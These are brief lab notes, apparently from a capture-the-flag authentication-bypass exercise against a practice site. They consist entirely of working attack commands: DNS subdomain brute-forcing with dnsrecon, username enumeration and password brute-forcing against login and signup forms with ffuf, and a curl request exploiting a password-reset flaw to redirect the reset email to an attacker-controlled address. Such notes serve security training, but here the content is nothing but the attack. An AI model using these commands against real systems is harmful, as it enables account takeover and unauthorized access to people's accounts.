DNS Bruteforce

```bash
dnsrecon -t brt -d acmeitsupport.thm
```

Username Bruteforce

```shell
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.65.169.157/customers/signup -mr "username already exists"`
```

Username and Password bruteforce

```shell
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.65.169.157/customers/login -fc 200
```

Login Flaw

```shell
curl 'http://10.65.169.157/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=**{username}**@customer.acmeitsupport.thm'`
```
